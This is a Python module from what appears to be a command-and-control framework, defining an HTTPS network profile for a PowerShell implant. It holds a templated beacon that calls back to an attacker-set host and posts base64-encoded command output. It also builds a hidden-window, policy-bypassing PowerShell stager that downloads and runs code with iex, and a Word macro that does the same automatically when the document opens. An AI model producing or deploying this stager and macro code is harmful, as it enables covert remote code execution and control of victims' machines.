

class HttpsProfile:
    name = "HTTPS Profile"
    description = "This is a basic network profile which use base64 commands and is encrypted over via standard TLS. Uses 3 seperate enpoints."
    profile_tag = "HttpsProfile"

    def get_powershell_code(self):
        a = '''
function {{ ron.HttpsProfile }}(${{ ron.obf_callback_reason }}){
    if ( ${{ ron.obf_callback_reason }} -eq $null ){
        $URL = "https://"+${{ ron.obf_callback_url }}+":{{ ports.HttpsProfile_port }}/"
        $r = iwr -uri $URL -headers @{"X-Implant" = "{{ uii }}"} -method 'GET' -UseBasicParsing -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363"
        $global:headers = $r.Content
    } else {
        $URL = "https://"+${{ ron.obf_callback_url }}+":{{ ports.HttpsProfile_port }}/login"
        $enc = [system.Text.Encoding]::UTF8
        $data2 = [System.Convert]::ToBase64String($enc.GetBytes(${{ ron.obf_callback_reason }}))
        $data2 = $global:command_id+$data2
        $r = iwr -uri $URL -method 'POST' -headers @{"X-Result"= "{{ uii }}"} -body $data2 -UseBasicParsing -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363"
        $global:headers = $r.Content
    }
}'''
        return a

    def get_powershell_obf_strings(self):
        to_obf = {
            "HttpsProfile": "HttpsProfile_rnd"
        }
        port_number = {
            "HttpsProfile_port": None
        }
        return to_obf, port_number

    def get_powershell_implant_stager(self, implant_data=None):
        stager_string = f"powershell -windowstyle hidden -exec bypass -c " \
                        f"\"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::" \
                        f"DefaultNetworkCredentials;(iwr 'https://{implant_data['callback_url']}:{implant_data['network_profiles'][self.profile_tag]}" \
                        f"/error.htm?user={ implant_data['stager_key']}\' -UseBasicParsing)|iex\""
        return stager_string

    def get_docm_implant_stager(self, implant_data=None):
        stager_string = f'''
Sub Auto_Open()
Dim exec As String
exec = "powershell.exe ""IEX ((new-object net.webclient).downloadstring('https://{implant_data['callback_url']}:{implant_data['network_profiles'][self.profile_tag]}/error.htm?user={implant_data['stager_key']}'))"""
Shell (exec)
End Sub
:return:'''
        return stager_string

    def get_webform(self):
        webform = (f"<div>"
                   f"    <label  class=\"font-weight-bold\" >{self.name}</label>"
                   f'    <p><span class="font-italic">If left blank this network profile will not be included in the implant.</span><p>'
                   f'    <input type="text" class="form-control" id="{self.profile_tag}" name="{self.profile_tag}" placeholder="TCP port for HTTPS listener">'
                   f"</div>")

        return webform

    def validate_web_form(self, key, value):
        try:
            if int(value) > 0 and int(value) < 65355:
                return {self.profile_tag: int(value)}
            else:
                return False
        except:
            return False

    def get_listener_profile_form(self):
        a = {"name": self.name,
             "profile_tag": self.profile_tag,
             "port": "Port"}
        return a

    @staticmethod
    def get_listener_interface():
        import NetworkProfiles.Profiles.HttpsProfile.HttpsInterface as interface
        interface = interface.ListenerInterface()
        return interface

    @staticmethod
    def get_listener_object():
        import NetworkProfiles.Profiles.HttpsProfile.HttpsListener as listener
        return listener
